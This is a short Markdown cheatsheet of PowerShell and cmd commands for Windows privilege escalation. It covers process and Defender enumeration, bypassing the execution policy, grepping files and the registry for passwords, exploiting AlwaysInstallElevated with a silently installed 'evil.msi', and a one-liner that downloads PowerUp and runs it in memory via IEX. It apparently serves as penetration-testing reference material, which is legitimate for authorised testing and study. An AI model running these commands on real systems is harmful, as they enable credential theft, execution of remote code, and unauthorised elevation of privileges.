# Windows Privilege Escalation Cheatsheet

## Information gathering

### Powershell informations

```powershell
echo $Env:PSModulePath
Get-ExecutionPolicy
```

### Processes and owners

```powershell
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```

### Processes running as system

```powershell
tasklist /v /fi "username eq system"
```

### Windows Defender status

```powershell
Get-MpComputerStatus
```

## Bypass powershell execution policy

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

## Download file

```powershell
Invoke-WebRequest http://url-to/file.ps1 -OutFile C:\path\to\file.ps1
```

## Search for passwords in filesystem

```powershell
findstr /si password *.xml *.ini *.txt *.config
```

```powershell
reg query HKLM /f password /t REG_SZ /s /k
```

```powershell
reg query HKCU /f password /t REG_SZ /s /k
```

## MSI register

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
```

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
```

If both return 1, then get an evil.msi and:

```powershell
msiexec /quiet /qn /i evil.msi
```

## Popular tools

### Load PowerUp

```powershell
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```
